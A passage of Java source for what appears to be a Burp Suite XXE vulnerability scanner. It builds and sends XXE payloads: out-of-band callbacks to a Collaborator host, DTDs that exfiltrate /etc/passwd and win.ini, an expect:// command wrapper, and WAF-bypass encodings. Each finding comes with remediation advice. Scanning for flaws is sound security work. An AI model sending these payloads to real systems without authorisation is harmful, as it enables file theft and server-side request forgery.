                        .description("The XML parser expands internal entity definitions. "
                                + "While this alone proves entity processing is enabled, it strongly "
                                + "suggests external entities (SYSTEM/PUBLIC) may also be processed. "
                                + "Remediation: Disable DTD processing and entity expansion.")
                        .payload(recursivePayload)
                        .responseEvidence("XXE_PROBE_CONFIRMED")
                        .requestResponse(recursiveResult)
                        .build());
            }
        }

        perHostDelay();
    }

    // ==================== PHASE 1c: BLIND XXE VIA OOB (COLLABORATOR) ====================

    /**
     * Tests blind XXE using Burp Collaborator for out-of-band detection.
     * Includes parameter entity with external DTD, direct entity callback,
     * and data exfiltration via parameter entities.
     */
    private void testBlindXxeOob(HttpRequestResponse original, String url,
                                  String requestBody) throws InterruptedException {

        // OOB Payload 1: Parameter entity loading external DTD from Collaborator
        AtomicReference<HttpRequestResponse> sentRequest1 = new AtomicReference<>();
        String collabPayload1 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB parameter entity external DTD",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest1.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "Parameter entity external DTD load", sentRequest1.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload1 != null) {
            String paramEntityDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload1 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String paramEntityPayload = injectDtdIntoXml(requestBody, paramEntityDtd, "");
            HttpRequestResponse result1 = sendRawRequest(original, paramEntityPayload);
            sentRequest1.set(result1);
            perHostDelay();
        }

        // OOB Payload 2: Direct entity callback to Collaborator
        AtomicReference<HttpRequestResponse> sentRequest2 = new AtomicReference<>();
        String collabPayload2 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB direct entity callback",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest2.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "Direct entity HTTP callback", sentRequest2.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload2 != null) {
            String directEntityDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload2 + "/xxe\">\n"
                    + "]>\n";
            String directEntityPayload = injectDtdIntoXml(requestBody, directEntityDtd, "&xxe;");
            HttpRequestResponse result2 = sendRawRequest(original, directEntityPayload);
            sentRequest2.set(result2);
            perHostDelay();
        }

        // OOB Payload 3: Parameter entity with HTTPS callback
        AtomicReference<HttpRequestResponse> sentRequest3 = new AtomicReference<>();
        String collabPayload3 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB parameter entity HTTPS",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest3.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "Parameter entity HTTPS callback", sentRequest3.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload3 != null) {
            String httpsParamEntityDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"https://" + collabPayload3 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String httpsPayload = injectDtdIntoXml(requestBody, httpsParamEntityDtd, "");
            HttpRequestResponse result3 = sendRawRequest(original, httpsPayload);
            sentRequest3.set(result3);
            perHostDelay();
        }

        // OOB Payload 4: Data exfiltration via nested parameter entities
        // This technique uses a parameter entity to read a file, then sends its
        // content as part of a URL to the Collaborator server.
        AtomicReference<HttpRequestResponse> sentRequest4 = new AtomicReference<>();
        String collabPayload4 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB data exfiltration via parameter entity",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest4.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "Data exfiltration via parameter entity", sentRequest4.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload4 != null) {
            String exfilDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"http://" + collabPayload4 + "/xxe\">\n"
                    + "  %dtd;\n"
                    + "]>\n";
            String exfilPayload = injectDtdIntoXml(requestBody, exfilDtd, "");
            HttpRequestResponse result4 = sendRawRequest(original, exfilPayload);
            sentRequest4.set(result4);
            perHostDelay();
        }

        // OOB Payload 5: Standalone XML with OOB parameter entity
        AtomicReference<HttpRequestResponse> sentRequest5 = new AtomicReference<>();
        String collabPayload5 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB standalone parameter entity",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest5.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "Standalone XML parameter entity OOB", sentRequest5.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload5 != null) {
            String standaloneOobXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload5 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n"
                    + "<foo>test</foo>";
            HttpRequestResponse result5 = sendRawRequest(original, standaloneOobXml);
            sentRequest5.set(result5);
            perHostDelay();
        }

        // OOB Payload 6: Direct entity callback via standalone XML
        AtomicReference<HttpRequestResponse> sentRequest6 = new AtomicReference<>();
        String collabPayload6 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB standalone direct entity",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest6.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "Standalone XML direct entity OOB", sentRequest6.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload6 != null) {
            String standaloneDirectXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload6 + "/xxe\">\n"
                    + "]>\n"
                    + "<foo>&xxe;</foo>";
            HttpRequestResponse result6 = sendRawRequest(original, standaloneDirectXml);
            sentRequest6.set(result6);
            perHostDelay();
        }

        // OOB Payload 7: FTP protocol for blind exfiltration
        AtomicReference<HttpRequestResponse> sentRequest7 = new AtomicReference<>();
        String collabPayload7 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB FTP exfiltration",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest7.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "FTP-based OOB exfiltration", sentRequest7.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload7 != null) {
            String ftpDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"ftp://" + collabPayload7 + "/xxe\">\n"
                    + "  %dtd;\n"
                    + "]>\n";
            String ftpPayload = injectDtdIntoXml(requestBody, ftpDtd, "");
            HttpRequestResponse result7 = sendRawRequest(original, ftpPayload);
            sentRequest7.set(result7);
            perHostDelay();
        }

        // OOB Payload 8: JAR protocol (Java-specific)
        AtomicReference<HttpRequestResponse> sentRequest8 = new AtomicReference<>();
        String collabPayload8 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB JAR protocol",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest8.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "JAR protocol OOB callback", sentRequest8.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload8 != null) {
            String jarDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"jar:http://" + collabPayload8 + "/xxe!/test\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String jarPayload = injectDtdIntoXml(requestBody, jarDtd, "");
            HttpRequestResponse result8 = sendRawRequest(original, jarPayload);
            sentRequest8.set(result8);
            perHostDelay();
        }

        // OOB Payload 9: netdoc protocol (Java-specific)
        AtomicReference<HttpRequestResponse> sentRequest9 = new AtomicReference<>();
        String collabPayload9 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB netdoc protocol",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest9.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "netdoc protocol OOB callback", sentRequest9.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload9 != null) {
            String netdocDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"netdoc://" + collabPayload9 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String netdocPayload = injectDtdIntoXml(requestBody, netdocDtd, "");
            HttpRequestResponse result9 = sendRawRequest(original, netdocPayload);
            sentRequest9.set(result9);
            perHostDelay();
        }

        // OOB Payload 10: gopher protocol
        AtomicReference<HttpRequestResponse> sentRequest10 = new AtomicReference<>();
        String collabPayload10 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB gopher protocol",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest10.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "gopher protocol OOB callback", sentRequest10.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload10 != null) {
            String gopherDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"gopher://" + collabPayload10 + ":70/_xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String gopherPayload = injectDtdIntoXml(requestBody, gopherDtd, "");
            HttpRequestResponse result10 = sendRawRequest(original, gopherPayload);
            sentRequest10.set(result10);
            perHostDelay();
        }

        // OOB Payload 11: PHP filter chain
        AtomicReference<HttpRequestResponse> sentRequest11 = new AtomicReference<>();
        String collabPayload11 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB PHP filter chain",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest11.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "PHP filter chain OOB callback", sentRequest11.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload11 != null) {
            String phpFilterDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://"
                    + collabPayload11 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String phpFilterPayload = injectDtdIntoXml(requestBody, phpFilterDtd, "");
            HttpRequestResponse result11 = sendRawRequest(original, phpFilterPayload);
            sentRequest11.set(result11);
            perHostDelay();
        }

        // OOB Payload 12: PHP expect wrapper
        AtomicReference<HttpRequestResponse> sentRequest12 = new AtomicReference<>();
        String collabPayload12 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB PHP expect wrapper",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest12.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url, "PHP expect wrapper OOB callback", sentRequest12.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload12 != null) {
            String phpExpectDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"expect://nslookup+" + collabPayload12 + "\">\n"
                    + "]>\n";
            String phpExpectPayload = injectDtdIntoXml(requestBody, phpExpectDtd, "&xxe;");
            HttpRequestResponse result12 = sendRawRequest(original, phpExpectPayload);
            sentRequest12.set(result12);
            perHostDelay();
        }

        // OOB Payload 13: Data exfiltration of /etc/passwd via nested parameter entities + external DTD
        AtomicReference<HttpRequestResponse> sentRequest13 = new AtomicReference<>();
        String collabPayload13 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB /etc/passwd exfiltration via external DTD",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest13.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url,
                            "Data exfiltration /etc/passwd via external DTD + nested param entities", sentRequest13.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload13 != null) {
            String exfilPasswdDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"http://" + collabPayload13 + "/xxe.dtd\">\n"
                    + "  %dtd;\n"
                    + "  %send;\n"
                    + "]>\n";
            // The external DTD at the Collaborator server would define:
            // <!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?data=%file;'>">
            // This payload triggers the DNS/HTTP interaction regardless of DTD content
            String exfilPasswdPayload = injectDtdIntoXml(requestBody, exfilPasswdDtd, "");
            HttpRequestResponse result13 = sendRawRequest(original, exfilPasswdPayload);
            sentRequest13.set(result13);
            perHostDelay();
        }

        // OOB Payload 14: Data exfiltration of C:/Windows/win.ini via nested parameter entities
        AtomicReference<HttpRequestResponse> sentRequest14 = new AtomicReference<>();
        String collabPayload14 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB win.ini exfiltration via external DTD",
                interaction -> {
                    // Brief spin-wait to let the sending thread complete set()
                    for (int _w = 0; _w < 10 && sentRequest14.get() == null; _w++) {
                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                    }
                    reportOobFinding(interaction, url,
                            "Data exfiltration C:/Windows/win.ini via external DTD + nested param entities", sentRequest14.get());  // may be null if callback fires before set() — finding is still reported
                });
        if (collabPayload14 != null) {
            String exfilWinIniDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"http://" + collabPayload14 + "/xxe.dtd\">\n"
                    + "  %dtd;\n"
                    + "  %send;\n"
                    + "]>\n";
            String exfilWinIniPayload = injectDtdIntoXml(requestBody, exfilWinIniDtd, "");
            HttpRequestResponse result14 = sendRawRequest(original, exfilWinIniPayload);
            sentRequest14.set(result14);
            perHostDelay();
        }
    }

    /**
     * Reports a confirmed OOB XXE finding from a Collaborator interaction.
     * Overload without requestResponse for backward compatibility.
     */
    private void reportOobFinding(Interaction interaction, String url, String technique) {
        reportOobFinding(interaction, url, technique, null);
    }

    /**
     * Reports a confirmed OOB XXE finding from a Collaborator interaction,
     * attaching the original HTTP request/response that triggered the callback.
     */
    private void reportOobFinding(Interaction interaction, String url, String technique,
                                   HttpRequestResponse requestResponse) {
        // Mark xml_body as confirmed — skip remaining XXE phases
        oobConfirmedParams.add("xml_body");
        Finding.Builder builder = Finding.builder("xxe-scanner",
                        "XXE Confirmed (Out-of-Band): " + technique,
                        Severity.CRITICAL, Confidence.CERTAIN)
                .url(url).parameter("xml_body")
                .evidence("Technique: " + technique
                        + " | Collaborator " + interaction.type().name()
                        + " interaction from " + interaction.clientIp()
                        + " at " + interaction.timeStamp())
                .description("XML External Entity injection confirmed via Burp Collaborator. "
                        + "The XML parser resolved an external entity and made an outbound "
                        + interaction.type().name() + " request to the Collaborator server. "
                        + "Technique: " + technique + ". "
                        + "This confirms the parser processes external entities. "
                        + "An attacker can use this to read arbitrary files from the server, "
                        + "perform SSRF, or exfiltrate data. "
                        + "Remediation: Disable external entity processing and DTDs in the XML parser.")
                .payload(technique);
        if (requestResponse != null) {
            builder.requestResponse(requestResponse);
        }
        findingsStore.addFinding(builder.build());
        api.logging().logToOutput("[XXE OOB] Confirmed! " + technique + " at " + url
                + " | " + interaction.type().name() + " from " + interaction.clientIp());
    }

    // ==================== PHASE 1d: UTF-16 ENCODING BYPASS ====================

    /**
     * Tests XXE payloads encoded in UTF-16 to bypass WAFs and parsers that only
     * inspect UTF-8 content. Some XML parsers honor the encoding declaration and
     * process UTF-16 encoded payloads even when UTF-8 DOCTYPE patterns are blocked.
     * Uses fingerprint to choose the right file target (Linux vs Windows).
     */
    private void testUtf16Bypass(HttpRequestResponse original, String url,
                                  String baselineBody,
                                  TargetFingerprint fingerprint) throws InterruptedException {

        // Select file targets based on fingerprint
        String linuxFile = "/etc/passwd";
        Pattern linuxEvidence = LINUX_PASSWD_EVIDENCE;
        String winFile = "C:/Windows/win.ini";
        Pattern winEvidence = WINDOWS_WIN_INI_EVIDENCE;

        boolean testLinux = fingerprint.os != DetectedOS.WINDOWS;
        boolean testWindows = fingerprint.os != DetectedOS.LINUX;

        // UTF-16 LE with BOM — Linux target
        if (testLinux) {
            testUtf16Payload(original, url, baselineBody, linuxFile, linuxEvidence,
                    "UTF-16 LE", "Linux",
                    new byte[]{(byte) 0xFF, (byte) 0xFE},
                    java.nio.charset.StandardCharsets.UTF_16LE, "utf-16le");
            perHostDelay();
        }

        // UTF-16 BE with BOM — Linux target
        if (testLinux) {
            testUtf16Payload(original, url, baselineBody, linuxFile, linuxEvidence,
                    "UTF-16 BE", "Linux",
                    new byte[]{(byte) 0xFE, (byte) 0xFF},
                    java.nio.charset.StandardCharsets.UTF_16BE, "utf-16be");
            perHostDelay();
        }

        // UTF-16 LE with BOM — Windows target
        if (testWindows) {
            testUtf16Payload(original, url, baselineBody, winFile, winEvidence,
                    "UTF-16 LE", "Windows",
                    new byte[]{(byte) 0xFF, (byte) 0xFE},
                    java.nio.charset.StandardCharsets.UTF_16LE, "utf-16le");
            perHostDelay();
        }

        // UTF-16 OOB variant (blind) — uses Collaborator if standard UTF-16 didn't yield results
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            AtomicReference<HttpRequestResponse> sentUtf16Oob = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "xxe-scanner", url, "xml_body", "XXE OOB via UTF-16 encoding bypass",
                    interaction -> reportOobFinding(interaction, url,
                            "UTF-16 encoding bypass OOB", sentUtf16Oob.get()));
            if (collabPayload != null) {
                String oobXml = "<?xml version=\"1.0\" encoding=\"UTF-16LE\"?>\n"
                        + "<!DOCTYPE foo [\n"
                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload + "/xxe\">\n"
                        + "  %xxe;\n"
                        + "]>\n"
                        + "<foo>test</foo>";
                try {
                    byte[] bom = {(byte) 0xFF, (byte) 0xFE};
                    byte[] xmlBytes = oobXml.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
                    byte[] payload = new byte[bom.length + xmlBytes.length];
                    System.arraycopy(bom, 0, payload, 0, bom.length);
                    System.arraycopy(xmlBytes, 0, payload, bom.length, xmlBytes.length);

                    HttpRequest modified = original.request()
                            .withRemovedHeader("Content-Type")
                            .withAddedHeader("Content-Type", "application/xml; charset=utf-16le")
                            .withBody(ByteArray.byteArray(payload));
                    HttpRequestResponse result = api.http().sendRequest(modified);
                    sentUtf16Oob.set(result);
                } catch (Exception e) {
                    api.logging().logToError("[XXE] UTF-16 OOB test error: " + e.getMessage());
                }
            }
            perHostDelay();
        }
    }

    /**
     * Sends a single UTF-16 encoded XXE file-read payload and checks for evidence.
     */
    private void testUtf16Payload(HttpRequestResponse original, String url,
                                   String baselineBody, String filePath,
                                   Pattern evidencePattern, String encoding,
                                   String osType, byte[] bom,
                                   java.nio.charset.Charset charset, String charsetName) {
        String xxeXml = "<?xml version=\"1.0\" encoding=\"" + charsetName.toUpperCase() + "\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe SYSTEM \"file://" + filePath + "\">\n"
                + "]>\n"
                + "<foo>&xxe;</foo>";
        try {
            byte[] xmlBytes = xxeXml.getBytes(charset);
            byte[] payload = new byte[bom.length + xmlBytes.length];
            System.arraycopy(bom, 0, payload, 0, bom.length);
            System.arraycopy(xmlBytes, 0, payload, bom.length, xmlBytes.length);

            HttpRequest modified = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", "application/xml; charset=" + charsetName)
                    .withBody(ByteArray.byteArray(payload));
            HttpRequestResponse result = api.http().sendRequest(modified);

            if (result != null && result.response() != null) {
                String responseBody = result.response().bodyToString();
                if (responseBody != null
                        && evidencePattern.matcher(responseBody).find()
                        && !evidencePattern.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via " + encoding + " Encoding Bypass: " + filePath + " (" + osType + ")",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (" + encoding + ")")
                            .evidence(encoding + " encoded XXE payload bypassed filters and read " + filePath)
                            .description("XXE injection confirmed using " + encoding + " encoding. The XML "
                                    + "parser honored the " + encoding + " encoding declaration, bypassing "
                                    + "any input filters that only inspect UTF-8 content. "
                                    + "Remediation: Normalize XML encoding before parsing. Disable external entities.")
                            .payload(xxeXml)
                            .requestResponse(result)
                            .build());
                }
            }
        } catch (Exception e) {
            api.logging().logToError("[XXE] " + encoding + " " + osType + " test error: " + e.getMessage());
        }
    }

    // ==================== PHASE 1e: DOUBLE-ENCODED ENTITY BYPASS ====================

    /**
     * Tests XXE payloads using double-encoded and alternative entity syntax to bypass
     * WAFs that filter standard DTD patterns. Techniques:
     *   - HTML entity encoding of % in parameter entities (&#x25; = %)
     *   - CDATA wrapping to hide entity references from output filters
     *   - Nested entity definitions (entity-within-entity)
     * Uses fingerprint to choose the right file target. All findings require
     * confirmed file content with baseline comparison to prevent false positives.
     */
    private void testDoubleEncodedBypass(HttpRequestResponse original, String url,
                                          String requestBody, String baselineBody,
                                          TargetFingerprint fingerprint) throws InterruptedException {

        boolean testLinux = fingerprint.os != DetectedOS.WINDOWS;
        boolean testWindows = fingerprint.os != DetectedOS.LINUX;

        // Bypass 1: HTML-encoded % in parameter entity (&#x25; = %)
        // Some WAFs block "<!ENTITY %" but allow the HTML-encoded form
        if (testLinux) {
            String encodedParamEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY &#x25; xxe SYSTEM \"file:///etc/passwd\">\n"
                    + "  &#x25;xxe;\n"
                    + "]>\n"
                    + "<foo>test</foo>";

            HttpRequestResponse result1 = sendRawRequest(original, encodedParamEntity);
            if (result1 != null && result1.response() != null) {
                String body = result1.response().bodyToString();
                if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via HTML-Encoded Parameter Entity Bypass: /etc/passwd read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (encoded &#x25;)")
                            .evidence("HTML-encoded &#x25; parameter entity bypassed filters — /etc/passwd read")
                            .description("XXE injection confirmed using HTML entity encoding of the % character "
                                    + "in parameter entity declarations (&#x25;). This bypasses WAFs that block "
                                    + "literal '<!ENTITY %' patterns. "
                                    + "Remediation: Disable DTD processing entirely instead of relying on pattern matching.")
                            .payload(encodedParamEntity)
                            .responseEvidence("root:x:0:0:")
                            .requestResponse(result1)
                            .build());
                    return; // confirmed, skip further bypass tests
                }
            }
            perHostDelay();
        }

        // Bypass 2: CDATA section wrapping to hide entity expansion from output filters
        if (testLinux) {
            String cdataBypass = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY start \"<![CDATA[\">\n"
                    + "  <!ENTITY end \"]]>\">\n"
                    + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                    + "]>\n"
                    + "<foo>&start;&xxe;&end;</foo>";

            HttpRequestResponse result2 = sendRawRequest(original, cdataBypass);
            if (result2 != null && result2.response() != null) {
                String body = result2.response().bodyToString();
                if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via CDATA Wrapping Bypass: /etc/passwd read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (CDATA)")
                            .evidence("CDATA-wrapped entity references bypassed content filters — /etc/passwd read")
                            .description("XXE injection confirmed using CDATA section wrapping around entity "
                                    + "references. This evades output encoding and content inspection. "
                                    + "Remediation: Disable external entity processing in the XML parser.")
                            .payload(cdataBypass)
                            .responseEvidence("root:x:0:0:")
                            .requestResponse(result2)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }

        // Bypass 3: Nested entity definition (entity defined via another entity)
        if (testLinux) {
            String nestedEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % a \"<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>\">\n"
                    + "  %a;\n"
                    + "  %b;\n"
                    + "]>\n"
                    + "<foo>test</foo>";

            HttpRequestResponse result3 = sendRawRequest(original, nestedEntity);
            if (result3 != null && result3.response() != null) {
                String body = result3.response().bodyToString();
                if (body != null) {
                    boolean hasPasswd = LINUX_PASSWD_EVIDENCE.matcher(body).find()
                            && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find();
                    boolean hasDtdError = DTD_PROCESSING_ERROR_PATTERN.matcher(body).find()
                            && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find();

                    if (hasPasswd) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Nested Entity Bypass: /etc/passwd read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("xml_body (nested entities)")
                                .evidence("Nested entity definition bypass succeeded — /etc/passwd content returned")
                                .description("XXE injection confirmed via nested parameter entity definitions. "
                                        + "Remediation: Disable DTD processing entirely.")
                                .payload(nestedEntity)
                                .responseEvidence("root:x:0:0:")
                                .requestResponse(result3)
                                .build());
                        return;
                    } else if (hasDtdError) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE Nested Entity Processing Detected",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter("xml_body (nested entities)")
                                .evidence("Nested entity definitions triggered DTD processing errors not in baseline")
                                .description("The XML parser attempted to process nested parameter entity "
                                        + "definitions, confirming DTD processing is active. While file content "
                                        + "was not directly returned, this confirms the parser is vulnerable. "
                                        + "Remediation: Disable DTD processing entirely.")
                                .payload(nestedEntity)
                                .requestResponse(result3)
                                .build());
                    }
                }
            }
            perHostDelay();
        }

        // Bypass 4: Windows targets with text/xml Content-Type bypass
        if (testWindows) {
            String winEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "]>\n"
                    + "<foo>&xxe;</foo>";

            HttpRequest winBypassReq = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", "text/xml")
                    .withBody(winEntity);
            try {
                HttpRequestResponse result4 = api.http().sendRequest(winBypassReq);
                if (result4 != null && result4.response() != null) {
                    String body = result4.response().bodyToString();
                    if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                            && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type text/xml Bypass: win.ini read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("xml_body (text/xml)")
                                .evidence("text/xml Content-Type bypass succeeded — win.ini content returned")
                                .description("XXE injection confirmed using text/xml Content-Type header. "
                                        + "The server accepted XML via text/xml even though the original "
                                        + "Content-Type may have been application/xml. "
                                        + "Remediation: Enforce strict Content-Type validation and disable external entities.")
                                .payload(winEntity)
                                .responseEvidence("[fonts]")
                                .requestResponse(result4)
                                .build());
                    }
                }
            } catch (Exception e) {
                api.logging().logToError("[XXE] Content-Type bypass test error: " + e.getMessage());
            }
            perHostDelay();
        }

        // Bypass 5: HTML-encoded % for Windows target
        if (testWindows) {
            String encodedWinEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY &#x25; xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "  &#x25;xxe;\n"
                    + "]>\n"
                    + "<foo>test</foo>";

            HttpRequestResponse result5 = sendRawRequest(original, encodedWinEntity);
            if (result5 != null && result5.response() != null) {
                String body = result5.response().bodyToString();
